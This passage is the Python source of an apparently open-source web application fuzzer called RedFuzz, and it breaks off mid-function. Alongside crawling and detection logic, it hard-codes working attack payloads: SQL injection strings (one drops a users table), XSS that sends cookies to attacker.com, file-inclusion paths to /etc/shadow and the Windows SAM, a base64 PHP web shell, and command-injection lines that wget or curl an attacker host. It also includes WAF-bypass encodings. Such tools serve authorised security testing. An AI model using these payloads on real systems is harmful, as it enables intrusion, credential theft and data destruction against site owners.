"""
RedFuzz - Advanced Web Application Fuzzer
Version: 5.0.0
Author: 0xRedHood (https://github.com/0xRedHood)
Description: A comprehensive web application fuzzer with advanced features including
stateful fuzzing, OpenAPI/Swagger integration, vulnerability verification, and plugin support.
GitHub: https://github.com/0xRedHood
"""

import requests
import argparse
import json
import time
import re
import sys
import yaml
import urllib3
import random
from urllib.parse import urlparse, parse_qs, urljoin
from concurrent.futures import ThreadPoolExecutor, as_completed
from difflib import SequenceMatcher
import threading
from typing import Dict, List, Optional, Any, Tuple
import logging
from dataclasses import dataclass, asdict
from datetime import datetime
import hashlib
import base64

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# For OpenAPI/Swagger support
try:
    import yaml as pyyaml
    OPENAPI_AVAILABLE = True
except ImportError:
    OPENAPI_AVAILABLE = False

# For BeautifulSoup web crawling
try:
    from bs4 import BeautifulSoup
    BEAUTIFULSOUP_AVAILABLE = True
except ImportError:
    BeautifulSoup = None
    BEAUTIFULSOUP_AVAILABLE = False

# For plugin system
import importlib.util
import os
from pathlib import Path

@dataclass
class VulnerabilityEvidence:
    """Evidence for a discovered vulnerability"""
    request_url: str
    request_method: str
    request_headers: Dict[str, str]
    request_body: Optional[str]
    response_status: int
    response_headers: Dict[str, str]
    response_body: str
    payload_used: str
    detection_time: datetime
    response_time: float

@dataclass
class Vulnerability:
    """Enhanced vulnerability data structure"""
    vuln_type: str
    parameter: str
    payload: str
    evidence: VulnerabilityEvidence
    severity: str
    confidence: float
    verified: bool = False
    false_positive: bool = False

@dataclass
class SessionState:
    """Represents the state of a session during stateful fuzzing"""
    session_id: str
    cookies: Dict[str, str]
    headers: Dict[str, str]
    current_url: str
    login_required: bool = False
    authenticated: bool = False
    created_at: datetime = None
    
    def __post_init__(self):
        if self.created_at is None:
            self.created_at = datetime.now()

@dataclass
class OpenAPISpec:
    """Represents an OpenAPI/Swagger specification"""
    endpoints: List[Dict[str, Any]]
    base_url: str
    security_schemes: Dict[str, Any]
    info: Dict[str, Any]

class PluginManager:
    """Manages plugins for RedFuzz"""
    
    def __init__(self):
        self.plugins = {}
        self.plugin_dir = Path("plugins")
        self.plugin_dir.mkdir(exist_ok=True)
    
    def load_plugins(self):
        """Load all available plugins"""
        for plugin_file in self.plugin_dir.glob("*.py"):
            if plugin_file.name.startswith("__"):
                continue
            try:
                spec = importlib.util.spec_from_file_location(
                    plugin_file.stem, plugin_file
                )
                module = importlib.util.module_from_spec(spec)
                spec.loader.exec_module(module)
                
                if hasattr(module, 'register_plugin'):
                    plugin_info = module.register_plugin()
                    self.plugins[plugin_info['name']] = {
                        'module': module,
                        'info': plugin_info
                    }
                    print(f"Loaded plugin: {plugin_info['name']}")
            except Exception as e:
                print(f"Failed to load plugin {plugin_file.name}: {e}")
    
    def execute_plugin(self, plugin_name: str, data: Any) -> Any:
        """Execute a specific plugin"""
        if plugin_name in self.plugins:
            plugin = self.plugins[plugin_name]
            if hasattr(plugin['module'], 'execute'):
                return plugin['module'].execute(data)
        return None

class SmartRateLimiter:
    """Dynamic rate limiter that adjusts based on server response"""
    
    def __init__(self, initial_delay: float = 0.1, max_delay: float = 5.0):
        self.current_delay = initial_delay
        self.max_delay = max_delay
        self.min_delay = 0.01
        self.response_times = []
        self.max_response_times = 10
        self.lock = threading.Lock()
    
    def adjust_delay(self, response_time: float):
        """Adjust delay based on response time"""
        with self.lock:
            self.response_times.append(response_time)
            if len(self.response_times) > self.max_response_times:
                self.response_times.pop(0)
            
            avg_response_time = sum(self.response_times) / len(self.response_times)
            
            # Adjust delay based on server performance
            if avg_response_time > 2.0:  # Server is slow
                self.current_delay = min(self.current_delay * 1.5, self.max_delay)
            elif avg_response_time < 0.5:  # Server is fast
                self.current_delay = max(self.current_delay * 0.8, self.min_delay)
    
    def get_delay(self) -> float:
        """Get current delay"""
        return self.current_delay

class RedFuzz:
    def __init__(self, target_url, threads=10, timeout=10, verbose=False, config_file=None):
        self.target_url = target_url
        self.threads = threads
        self.timeout = timeout
        self.verbose = verbose
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'RedFuzz/5.0.0 (Advanced Web Application Fuzzer)'
        })
        
        # Enhanced session management for stateful fuzzing
        self.session_states = {}
        self.current_session_id = None
        self.stateful_mode = False
        
        # OpenAPI/Swagger support
        self.openapi_spec = None
        self.api_endpoints = []
        
        # Plugin system
        self.plugin_manager = PluginManager()
        self.plugin_manager.load_plugins()
        
        # Smart rate limiting
        self.rate_limiter = SmartRateLimiter()
        
        # Enhanced vulnerability tracking
        self.vulnerabilities = []
        self.verified_vulnerabilities = []
        self.false_positives = []
        
        # Evidence collection
        self.evidence_collection = True
        
        # Vulnerability verification settings
        self.auto_verify = True
        self.verification_delay = 1.0
        
        # Load configuration if provided
        if config_file:
            self.load_config(config_file)
        
        # Context-aware fuzzing patterns
        self.context_patterns = {
            'id': ['lfi', 'rfi', 'path_traversal'],
            'file': ['lfi', 'rfi', 'path_traversal'],
            'path': ['lfi', 'rfi', 'path_traversal'],
            'search': ['xss', 'sqli'],
            'query': ['xss', 'sqli'],
            'q': ['xss', 'sqli'],
            'input': ['xss', 'sqli'],
            'user': ['sqli', 'auth_bypass'],
            'pass': ['sqli', 'auth_bypass'],
            'email': ['xss', 'sqli'],
            'url': ['open_redirect', 'ssrf'],
            'redirect': ['open_redirect'],
            'callback': ['open_redirect', 'jsonp'],
            'jsonp': ['open_redirect', 'jsonp']
        }
        
        # WAF bypass techniques
        self.waf_bypass_techniques = [
            'url_encoding',
            'double_encoding', 
            'hex_encoding',
            'unicode_encoding',
            'case_variation',
            'comment_injection',
            'null_byte_injection',
            'space_alternatives'
        ]
        
        # Enhanced payload categories
        self.payload_categories = {
            'sqli': [],
            'xss': [],
            'lfi': [],
            'rfi': [],
            'command_injection': [],
            'header_injection': [],
            'open_redirect': [],
            'ssrf': [],
            'auth_bypass': [],
            'jsonp': []
        }
        
        self.load_payloads()
        
        # Logging setup
        self.setup_logging()
    
    def load_payloads(self):
        """Load payloads from payloads.txt file"""
        try:
            with open('payloads.txt', 'r', encoding='utf-8') as f:
                payloads = [line.strip() for line in f if line.strip() and not line.startswith('#')]
            
            # Categorize payloads
            for payload in payloads:
                if any(keyword in payload.lower() for keyword in ['union', 'select', 'or', 'and', '--', '/*']):
                    self.payload_categories['sqli'].append(payload)
                elif any(keyword in payload.lower() for keyword in ['<script', 'javascript:', 'onerror', 'onload']):
                    self.payload_categories['xss'].append(payload)
                elif any(keyword in payload.lower() for keyword in ['../', '..\\', '/etc/', 'c:\\']):
                    self.payload_categories['lfi'].append(payload)
                elif any(keyword in payload.lower() for keyword in ['http://', 'https://', 'ftp://']):
                    self.payload_categories['rfi'].append(payload)
                elif any(keyword in payload.lower() for keyword in ['|', ';', '`', '$(', '&&']):
                    self.payload_categories['command_injection'].append(payload)
                elif any(keyword in payload.lower() for keyword in ['\r\n', 'crlf', 'header']):
                    self.payload_categories['header_injection'].append(payload)
                elif any(keyword in payload.lower() for keyword in ['redirect', 'location']):
                    self.payload_categories['open_redirect'].append(payload)
                elif any(keyword in payload.lower() for keyword in ['127.0.0.1', 'localhost', 'internal']):
                    self.payload_categories['ssrf'].append(payload)
                elif any(keyword in payload.lower() for keyword in ['admin', 'root', 'user']):
                    self.payload_categories['auth_bypass'].append(payload)
                elif any(keyword in payload.lower() for keyword in ['callback', 'jsonp']):
                    self.payload_categories['jsonp'].append(payload)
            
            self.log(f"Loaded {len(payloads)} payloads across {len(self.payload_categories)} categories")
            
        except FileNotFoundError:
            self.log("payloads.txt not found, using default payloads")
            # Add some default payloads if file not found
            self.payload_categories['sqli'].extend([
                "' OR '1'='1", "' OR 1=1--", "'; DROP TABLE users--",
                "admin'--", "admin'/*", "' UNION SELECT NULL--"
            ])
            self.payload_categories['xss'].extend([
                "<script>alert('XSS')</script>", "javascript:alert('XSS')",
                "<img src=x onerror=alert('XSS')>", "';alert('XSS');//"
            ])
            self.payload_categories['lfi'].extend([
                "../../../etc/passwd", "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
                "....//....//....//etc/passwd", "/etc/passwd"
            ])
        except Exception as e:
            self.log(f"Error loading payloads: {e}")

    def load_config(self, config_file):
        """Load configuration from YAML/JSON file"""
        try:
            with open(config_file, 'r', encoding='utf-8') as f:
                if config_file.endswith('.yaml') or config_file.endswith('.yml'):
                    return yaml.safe_load(f)
                elif config_file.endswith('.json'):
                    return json.load(f)
                else:
                    # Try both formats
                    try:
                        f.seek(0)
                        return yaml.safe_load(f)
                    except:
                        f.seek(0)
                        return json.load(f)
        except Exception as e:
            self.log(f"Error loading config file: {str(e)}")
            return {}
    
    def set_proxy(self, proxy_url):
        """Set proxy for requests"""
        try:
            self.session.proxies = {
                'http': proxy_url,
                'https': proxy_url
            }
            self.log(f"Proxy set to: {proxy_url}")
        except Exception as e:
            self.log(f"Error setting proxy: {str(e)}")
    
    def set_cookies(self, cookies):
        """Set cookies for session"""
        try:
            if isinstance(cookies, str):
                # Parse cookie string
                for cookie in cookies.split(';'):
                    if '=' in cookie:
                        name, value = cookie.strip().split('=', 1)
                        self.session.cookies.set(name, value)
            elif isinstance(cookies, dict):
                self.session.cookies.update(cookies)
            self.log("Cookies set successfully")
        except Exception as e:
            self.log(f"Error setting cookies: {str(e)}")
    
    def log(self, message, quiet=False):
        """Log message with timestamp"""
        if not quiet and not getattr(self, 'quiet_mode', False):
            timestamp = datetime.now().strftime("%H:%M:%S")
            print(f"[{timestamp}] {message}")
    
    def summary_log(self, message):
        """Log summary message without timestamp"""
        if not getattr(self, 'quiet_mode', False):
            print(message)
        
    def get_baseline_response(self, url):
        """Get baseline response for comparison"""
        try:
            response = self.session.get(url, timeout=self.timeout, verify=False)
            return {
                'status_code': response.status_code,
                'content': response.text,
                'size': len(response.content),
                'headers': dict(response.headers)
            }
        except:
            return None
    
    def apply_waf_bypass(self, payload, technique):
        """Apply WAF bypass technique to payload"""
        if technique == 'url_encoding':
            return requests.utils.quote(payload)
        elif technique == 'double_encoding':
            return requests.utils.quote(requests.utils.quote(payload))
        elif technique == 'hex_encoding':
            return ''.join([hex(ord(c))[2:] for c in payload])
        elif technique == 'unicode_encoding':
            return payload.encode('unicode_escape').decode()
        elif technique == 'case_variation':
            return ''.join(c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(payload))
        elif technique == 'comment_injection':
            return payload.replace("'", "'/**/")
        elif technique == 'null_byte_injection':
            return payload + '%00'
        elif technique == 'space_alternatives':
            return payload.replace(' ', '/**/')
        else:
            return payload
    
    def generate_context_aware_payloads(self, parameter_name, payload_type="all"):
        """Generate context-aware payloads based on parameter name"""
        # Determine context from parameter name
        param_lower = parameter_name.lower()
        contexts = []
        
        for pattern, context_list in self.context_patterns.items():
            if pattern in param_lower:
                contexts.extend(context_list)
        
        if not contexts:
            contexts = ['sql', 'xss', 'lfi', 'rfi', 'command']
        
        # Remove duplicates
        contexts = list(set(contexts))
        
        # Generate payloads for identified contexts
        payloads = []
        for context in contexts:
            context_payloads = self.generate_payloads(context)
            payloads.extend(context_payloads)
        
        return payloads
    
    def generate_payloads(self, payload_type="all", fast_mode=False, ultra_fast_mode=False):
        """Generate different types of payloads for fuzzing"""
        payloads = []
        
        # Fast mode reduces payload count
        if fast_mode:
            payload_type = "fast"
        elif ultra_fast_mode:
            payload_type = "ultra_fast"
        
        if payload_type in ["all", "sql", "standard"]:
            # SQL Injection payloads - Extended
            sql_payloads = [
                # Basic SQL Injection
                "' OR '1'='1",
                "' OR 1=1--",
                "'; DROP TABLE users--",
                "' UNION SELECT NULL--",
                "admin'--",
                "1' OR '1'='1'--",
                "' OR 1=1#",
                "' OR 1=1/*",
                
                # Advanced SQL Injection
                "' UNION SELECT username,password FROM users--",
                "' UNION SELECT @@version--",
                "' UNION SELECT database()--",
                "' UNION SELECT user()--",
                "' UNION SELECT table_name FROM information_schema.tables--",
                "' UNION SELECT column_name FROM information_schema.columns--",
                
                # Boolean-based
                "' AND 1=1--",
                "' AND 1=2--",
                "' AND (SELECT COUNT(*) FROM users)>0--",
                
                # Time-based
                "'; WAITFOR DELAY '00:00:05'--",
                "'; SLEEP(5)--",
                "'; pg_sleep(5)--",
                
                # Error-based
                "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT @@version),0x7e),1)--",
                "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT database()),0x7e))--",
            ]
            payloads.extend(sql_payloads)
        elif payload_type == "fast":
            # Fast mode - reduced SQL payloads
            sql_payloads = [
                "' OR '1'='1",
                "' OR 1=1--",
                "admin'--",
                "' UNION SELECT NULL--",
            ]
            payloads.extend(sql_payloads)
        elif payload_type == "ultra_fast":
            # Ultra fast mode - minimal SQL payloads
            sql_payloads = [
                "' OR '1'='1",
                "admin'--",
            ]
            payloads.extend(sql_payloads)
            
        if payload_type in ["all", "xss", "standard"]:
            # XSS payloads - Extended
            xss_payloads = [
                # Basic XSS
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "javascript:alert('XSS')",
                "<svg onload=alert('XSS')>",
                "'><script>alert('XSS')</script>",
                "<iframe src=javascript:alert('XSS')>",
                
                # Advanced XSS
                "<script>fetch('http://attacker.com?cookie='+document.cookie)</script>",
                "<img src=x onerror=\"fetch('http://attacker.com?cookie='+document.cookie)\">",
                "<svg onload=\"fetch('http://attacker.com?cookie='+document.cookie)\">",
                "<body onload=alert('XSS')>",
                "<input onfocus=alert('XSS') autofocus>",
                "<textarea onfocus=alert('XSS') autofocus>",
                
                # Filter bypass
                "<ScRiPt>alert('XSS')</ScRiPt>",
                "<script>alert(String.fromCharCode(88,83,83))</script>",
                "<script>eval('ale'+'rt(\"XSS\")')</script>",
            ]
            payloads.extend(xss_payloads)
        elif payload_type == "fast":
            # Fast mode - reduced XSS payloads
            xss_payloads = [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "javascript:alert('XSS')",
            ]
            payloads.extend(xss_payloads)
        elif payload_type == "ultra_fast":
            # Ultra fast mode - minimal XSS payloads
            xss_payloads = [
                "<script>alert('XSS')</script>",
            ]
            payloads.extend(xss_payloads)
            
        if payload_type in ["all", "lfi", "standard"]:
            # Local File Inclusion payloads - Extended
            lfi_payloads = [
                # Unix/Linux
                "../../../etc/passwd",
                "/etc/passwd",
                "....//....//....//etc/passwd",
                "..%2F..%2F..%2Fetc%2Fpasswd",
                "../../../etc/hosts",
                "/etc/hosts",
                "../../../etc/shadow",
                "/proc/version",
                "/proc/self/environ",
                
                # Windows
                "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
                "c:\\windows\\system32\\drivers\\etc\\hosts",
                "..\\..\\..\\windows\\system32\\config\\sam",
                "c:\\windows\\system32\\config\\sam",
                "..\\..\\..\\windows\\win.ini",
                "c:\\windows\\win.ini",
                
                # PHP specific
                "php://filter/convert.base64-encode/resource=index.php",
                "php://filter/read=convert.base64-encode/resource=index.php",
                "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOz8+",
                
                # Null byte injection
                "../../../etc/passwd%00",
                "/etc/passwd%00",
            ]
            payloads.extend(lfi_payloads)
        elif payload_type == "fast":
            # Fast mode - reduced LFI payloads
            lfi_payloads = [
                "../../../etc/passwd",
                "/etc/passwd",
                "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
                "c:\\windows\\system32\\drivers\\etc\\hosts",
            ]
            payloads.extend(lfi_payloads)
        elif payload_type == "ultra_fast":
            # Ultra fast mode - minimal LFI payloads
            lfi_payloads = [
                "../../../etc/passwd",
                "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            ]
            payloads.extend(lfi_payloads)
            
        if payload_type in ["all", "rfi", "standard"]:
            # Remote File Inclusion payloads - Extended
            rfi_payloads = [
                "http://evil.com/shell.txt",
                "https://attacker.com/backdoor.php",
                "ftp://evil.com/payload.txt",
                "//evil.com/shell.txt",
                "data://text/plain,<?php system($_GET['cmd']); ?>",
                "php://input",
                "expect://id",
                "file:///etc/passwd",
            ]
            payloads.extend(rfi_payloads)
        elif payload_type == "fast":
            # Fast mode - reduced RFI payloads
            rfi_payloads = [
                "http://evil.com/shell.txt",
                "https://attacker.com/backdoor.php",
            ]
            payloads.extend(rfi_payloads)
        elif payload_type == "ultra_fast":
            # Ultra fast mode - minimal RFI payloads
            rfi_payloads = [
                "http://evil.com/shell.txt",
            ]
            payloads.extend(rfi_payloads)
            
        if payload_type in ["all", "command", "standard"]:
            # Command Injection payloads - Extended
            cmd_payloads = [
                # Unix/Linux
                "; ls -la",
                "| whoami",
                "`id`",
                "$(whoami)",
                "; cat /etc/passwd",
                "| netstat -an",
                "; uname -a",
                "| ps aux",
                "; find / -name '*.txt'",
                "| wget http://attacker.com/shell",
                
                # Windows
                "& dir",
                "| whoami",
                "; dir",
                "& type C:\\windows\\system32\\drivers\\etc\\hosts",
                "| net user",
                "; systeminfo",
                "& ipconfig",
                "| tasklist",
                
                # Advanced
                "; ping -c 1 attacker.com",
                "| nslookup attacker.com",
                "; curl http://attacker.com",
                "| wget -qO- http://attacker.com",
            ]
            payloads.extend(cmd_payloads)
        elif payload_type == "fast":
            # Fast mode - reduced Command Injection payloads
            cmd_payloads = [
                "; ls -la",
                "| whoami",
                "& dir",
                "; cat /etc/passwd",
            ]
            payloads.extend(cmd_payloads)
        elif payload_type == "ultra_fast":
            # Ultra fast mode - minimal Command Injection payloads
            cmd_payloads = [
                "; ls -la",
                "& dir",
            ]
            payloads.extend(cmd_payloads)
            
        return payloads
    
    def crawl_website(self, base_url, max_depth=2):
        """Crawl website to discover endpoints and forms"""
        discovered_urls = set()
        discovered_forms = []
        
        def crawl_page(url, depth=0):
            if depth > max_depth or url in discovered_urls:
                return
            
            discovered_urls.add(url)
            
            try:
                response = self.session.get(url, timeout=self.timeout, verify=False)
                
                if not BEAUTIFULSOUP_AVAILABLE:
                    self.log("BeautifulSoup not available, skipping HTML parsing")
                    return
                
                soup = BeautifulSoup(response.text, 'html.parser')
                
                # Find all links
                for link in soup.find_all('a', href=True):
                    href = link['href']
                    absolute_url = urljoin(url, href)
                    
                    # Only crawl same domain
                    if urlparse(absolute_url).netloc == urlparse(base_url).netloc:
                        crawl_page(absolute_url, depth + 1)
                
                # Find all forms
                for form in soup.find_all('form'):
                    form_data = {
                        'action': urljoin(url, form.get('action', '')),
                        'method': form.get('method', 'GET').upper(),
                        'inputs': []
                    }
                    
                    for input_tag in form.find_all(['input', 'textarea', 'select']):
                        input_data = {
                            'name': input_tag.get('name', ''),
                            'type': input_tag.get('type', 'text'),
                            'value': input_tag.get('value', '')
                        }
                        form_data['inputs'].append(input_data)
                    
                    discovered_forms.append(form_data)
                    
            except Exception as e:
                if self.verbose:
                    self.log(f"Error crawling {url}: {str(e)}")
        
        crawl_page(base_url)
        return list(discovered_urls), discovered_forms
    
    def test_rest_api(self, endpoint, method="GET", data=None, headers=None):
        """Test REST API endpoints"""
        try:
            if method.upper() == "GET":
                response = self.session.get(endpoint, headers=headers, timeout=self.timeout, verify=False)
            elif method.upper() == "POST":
                response = self.session.post(endpoint, json=data, headers=headers, timeout=self.timeout, verify=False)
            elif method.upper() == "PUT":
                response = self.session.put(endpoint, json=data, headers=headers, timeout=self.timeout, verify=False)
            elif method.upper() == "DELETE":
                response = self.session.delete(endpoint, headers=headers, timeout=self.timeout, verify=False)
            else:
                return None
            
            return {
                'endpoint': endpoint,
                'method': method,
                'status_code': response.status_code,
                'response_size': len(response.content),
                'response_time': response.elapsed.total_seconds(),
                'content_type': response.headers.get('content-type', ''),
                'response_headers': dict(response.headers)
            }
            
        except Exception as e:
            if self.verbose:
                self.log(f"Error testing API {endpoint}: {str(e)}")
            return None
    
    def advanced_vulnerability_detection(self, response, payload, baseline=None):
        """Advanced vulnerability detection using multiple methods"""
        content = response.text.lower()
        headers = dict(response.headers)
        
        # Method 1: Keyword-based detection (existing)
        if self.keyword_based_detection(content, payload):
            return True, self.classify_vulnerability(payload, response)
        
        # Method 2: Response size comparison
        if baseline and self.size_based_detection(response, baseline):
            return True, "Potential Vulnerability (Size Difference)"
        
        # Method 3: Content similarity analysis
        if baseline and self.similarity_based_detection(response, baseline):
            return True, "Potential Vulnerability (Content Difference)"
        
        # Method 4: Error pattern detection
        if self.error_pattern_detection(content, headers):
            return True, "Potential Vulnerability (Error Pattern)"
        
        # Method 5: Time-based detection for blind vulnerabilities
        if self.time_based_detection(response, payload):
            return True, "Potential Blind Vulnerability"
        
        return False, None
    
    def keyword_based_detection(self, content, payload):
        """Enhanced keyword-based detection"""
        # SQL Injection indicators
        sql_indicators = [
            'sql syntax', 'mysql error', 'oracle error', 'sqlite error',
            'postgresql error', 'microsoft ole db provider', 'odbc error',
            'sql server', 'mysql_fetch_array', 'mysql_fetch_object',
            'mysql_num_rows', 'mysql_fetch_assoc', 'mysql_fetch_row',
            'supplied argument is not a valid mysql result',
            'you have an error in your sql syntax',
            'warning: mysql', 'mysql error', 'oracle error',
            'postgresql error', 'sqlite error', 'microsoft ole db',
            'odbc error', 'jdbc error', 'sql server error'
        ]
        
        # XSS indicators
        xss_indicators = [
            'script', 'javascript:', 'onerror', 'onload', 'onclick',
            'onmouseover', 'onfocus', 'onblur', 'onchange', 'onsubmit',
            'eval(', 'document.cookie', 'window.location', 'alert(',
            'confirm(', 'prompt(', 'innerhtml', 'outerhtml'
        ]
        
        # LFI indicators
        lfi_indicators = [
            'root:x:', 'bin:x:', 'daemon:x:', 'windows', 'system32',
            'administrator', 'guest:', 'nobody:', 'mysql:', 'apache:',
            'www-data:', 'nt authority', 'local system', 'network service',
            'windows nt', 'microsoft windows', 'win.ini', 'boot.ini',
            'system.ini', 'autoexec.bat', 'config.sys'
        ]
        
        # Command injection indicators
        cmd_indicators = [
            'uid=', 'gid=', 'groups=', 'home=', 'shell=', 'login:',
            'directory of', 'volume in drive', 'bytes free', 'total bytes',
            'file(s)', 'dir(s)', 'command completed', 'process list',
            'task list', 'system information', 'windows version'
        ]
        
        # Check for indicators
        all_indicators = sql_indicators + xss_indicators + lfi_indicators + cmd_indicators
        for indicator in all_indicators:
            if indicator in content:
                return True
                
        return False
    
    def size_based_detection(self, response, baseline):
        """Detect vulnerabilities based on response size differences"""
        current_size = len(response.content)
        baseline_size = baseline.get('size', 0)
        
        # If size difference is significant (>50% or >1000 bytes)
        if baseline_size > 0:
            size_diff = abs(current_size - baseline_size)
            size_ratio = size_diff / baseline_size
            
            if size_ratio > 0.5 or size_diff > 1000:
                return True
        
        return False
    
    def similarity_based_detection(self, response, baseline):
        """Detect vulnerabilities based on content similarity"""
        current_content = response.text
        baseline_content = baseline.get('content', '')
        
        if baseline_content:
            similarity = SequenceMatcher(None, baseline_content, current_content).ratio()
            # If similarity is low (<0.7), it might indicate a vulnerability
            if similarity < 0.7:
                return True
        
        return False
    
    def error_pattern_detection(self, content, headers):
        """Detect error patterns in response"""
        error_patterns = [
            r'error\s+\d+', r'warning\s+\d+', r'fatal\s+error',
            r'parse\s+error', r'syntax\s+error', r'undefined\s+',
            r'null\s+reference', r'index\s+out\s+of\s+bounds',
            r'division\s+by\s+zero', r'stack\s+overflow',
            r'access\s+violation', r'segmentation\s+fault'
        ]
        
        for pattern in error_patterns:
            if re.search(pattern, content, re.IGNORECASE):
                return True
        
        return False
    
    def time_based_detection(self, response, payload):
        """Detect time-based vulnerabilities"""
        # Check if response time is unusually long (indicating time-based injection)
        if response.elapsed.total_seconds() > 3:
            time_based_payloads = ['sleep', 'waitfor', 'benchmark', 'pg_sleep']
            if any(payload.lower() in p for p in time_based_payloads):
                return True
        
        return False
    
    def classify_vulnerability(self, payload, response):
        """Enhanced vulnerability classification"""
        content = response.text.lower()
        
        # SQL Injection
        sql_patterns = ['sql syntax', 'mysql error', 'oracle error', 'sqlite error', 
                       'postgresql error', 'microsoft ole db', 'odbc error', 'jdbc error']
        if any(pattern in content for pattern in sql_patterns):
            return 'SQL Injection'
        
        # XSS
        xss_patterns = ['script', 'javascript:', 'onerror', 'onload', 'onclick', 'eval(']
        if any(pattern in content for pattern in xss_patterns):
            return 'XSS'
        
        # LFI
        lfi_patterns = ['root:x:', 'bin:x:', 'daemon:x:', 'windows', 'system32', 'administrator']
        if any(pattern in content for pattern in lfi_patterns):
            return 'LFI'
        
        # Command Injection
        cmd_patterns = ['uid=', 'gid=', 'groups=', 'directory of', 'volume in drive', 'bytes free']
        if any(pattern in content for pattern in cmd_patterns):
            return 'Command Injection'
        
        # RFI
        if 'http://' in payload or 'https://' in payload or 'ftp://' in payload:
            return 'RFI'
        
        return 'Potential Vulnerability'
    
    def fuzz_parameter(self, url, param, payload, method="GET", data=None, headers=None, waf_bypass=False):
        """Enhanced parameter fuzzing with WAF bypass support"""
        try:
            # Apply WAF bypass if requested
            if waf_bypass:
                payload = self.apply_waf_bypass(payload, random.choice(self.waf_bypass_techniques))
            
            if method.upper() == "GET":
                # Create test URL with payload
                test_url = url.replace(f"{param}=", f"{param}={payload}")
                response = self.session.get(test_url, timeout=self.timeout, verify=False)
            elif method.upper() == "POST":
                # Fuzz POST data
                test_data = data.copy() if data else {}
                test_data[param] = payload
                response = self.session.post(url, data=test_data, timeout=self.timeout, verify=False)
            else:
                return None
            
            # Analyze response
            result = {
                'url': url,
                'parameter': param,
                'payload': payload,
                'method': method,
                'status_code': response.status_code,
                'response_size': len(response.content),
                'response_time': response.elapsed.total_seconds(),
                'content_type': response.headers.get('content-type', ''),
                'vulnerable': False,
                'vulnerability_type': None
            }
            
            # Advanced vulnerability detection
            vulnerable, vuln_type = self.advanced_vulnerability_detection(
                response, payload, self.baseline_response
            )
            
            if vulnerable:
                result['vulnerable'] = True
                result['vulnerability_type'] = vuln_type
                
            return result
            
        except requests.exceptions.RequestException as e:
            if self.verbose:
                self.log(f"Error fuzzing {url}: {str(e)}")
            return None
    
    def fuzz_headers(self, url, header_name, payload, waf_bypass=False):
        """Fuzz HTTP headers with WAF bypass support"""
        try:
            # Apply WAF bypass if requested
            if waf_bypass:
                payload = self.apply_waf_bypass(payload, random.choice(self.waf_bypass_techniques))
            
            headers = {header_name: payload}
            response = self.session.get(url, headers=headers, timeout=self.timeout, verify=False)
            
            result = {
                'url': url,
                'parameter': f"Header: {header_name}",
                'payload': payload,
                'method': 'HEADER',
                'status_code': response.status_code,
                'response_size': len(response.content),
                'response_time': response.elapsed.total_seconds(),
                'content_type': response.headers.get('content-type', ''),
                'vulnerable': False,
                'vulnerability_type': None
            }
            
            # Advanced vulnerability detection
            vulnerable, vuln_type = self.advanced_vulnerability_detection(
                response, payload, self.baseline_response
            )
            
            if vulnerable:
                result['vulnerable'] = True
                result['vulnerability_type'] = vuln_type
                
            return result
            
        except requests.exceptions.RequestException as e:
            if self.verbose:
                self.log(f"Error fuzzing header {header_name}: {str(e)}")
            return None
    
    def fuzz_url(self, url, payloads, method="GET", post_data=None, fuzz_headers=False, context_aware=False, waf_bypass=False, tui=None):
        """Enhanced URL fuzzing with context-aware and WAF bypass support"""
        parsed_url = urlparse(url)
        params = {}
        
        # Parse query parameters
        if parsed_url.query:
            params = parse_qs(parsed_url.query)
        
        results = []
        total_requests = 0
        
        # Get baseline response
        self.baseline_response = self.get_baseline_response(url)
        
        # If no parameters, try common parameter names for GET or use POST data for POST
        if not params:
            if method.upper() == "GET":
                common_params = ['id', 'page', 'file', 'path', 'search', 'q', 'query', 'name', 'user']
                for param in common_params:
                    # Use context-aware payloads if enabled
                    if context_aware:
                        param_payloads = self.generate_context_aware_payloads(param)
                    else:
                        param_payloads = payloads
                    
                    for payload in param_payloads:
                        test_url = f"{url}{'&' if '?' in url else '?'}{param}={payload}"
                        
                        # Update TUI if provided
                        if tui:
                            tui.update_progress(total_requests + 1, len(payloads), test_url, payload)
                            tui.stats['current_url'] = test_url
                            tui.stats['current_payload'] = payload
                            tui.stats['total_requests'] = total_requests + 1
                        
                        result = self.fuzz_parameter(test_url, param, payload, method, waf_bypass=waf_bypass)
                        if result:
                            results.append(result)
                            # Update TUI with vulnerability if found
                            if tui and result.get('vulnerable'):
                                tui.add_vulnerability(result)
                                tui.stats['vulnerabilities_found'] += 1
                        
                        total_requests += 1
            elif method.upper() == "POST" and post_data:
                # For POST requests, fuzz the POST data parameters
                for param in post_data.keys():
                    # Use context-aware payloads if enabled
                    if context_aware:
                        param_payloads = self.generate_context_aware_payloads(param)
                    else:
                        param_payloads = payloads
                    
                    for payload in param_payloads:
                        # Update TUI if provided
                        if tui:
                            tui.update_progress(total_requests + 1, len(payloads), url, payload)
                            tui.stats['current_url'] = url
                            tui.stats['current_payload'] = payload
                            tui.stats['total_requests'] = total_requests + 1
                        
                        result = self.fuzz_parameter(url, param, payload, method, post_data, waf_bypass=waf_bypass)
                        if result:
                            results.append(result)
                            # Update TUI with vulnerability if found
                            if tui and result.get('vulnerable'):
                                tui.add_vulnerability(result)
                                tui.stats['vulnerabilities_found'] += 1
                        
                        total_requests += 1
            else:
                # If no parameters and no POST data, try common parameter names for any method
                common_params = ['id', 'page', 'file', 'path', 'search', 'q', 'query', 'name', 'user', 'data', 'input', 'param']
                for param in common_params:
                    # Use context-aware payloads if enabled
                    if context_aware:
                        param_payloads = self.generate_context_aware_payloads(param)
                    else:
                        param_payloads = payloads
                    
                    for payload in param_payloads:
                        if method.upper() == "GET":
                            test_url = f"{url}{'&' if '?' in url else '?'}{param}={payload}"
                        else:
                            test_url = url
                        
                        # Update TUI if provided
                        if tui:
                            tui.update_progress(total_requests + 1, len(payloads), test_url, payload)
                            tui.stats['current_url'] = test_url
                            tui.stats['current_payload'] = payload
                            tui.stats['total_requests'] = total_requests + 1
                        
                        if method.upper() == "GET":
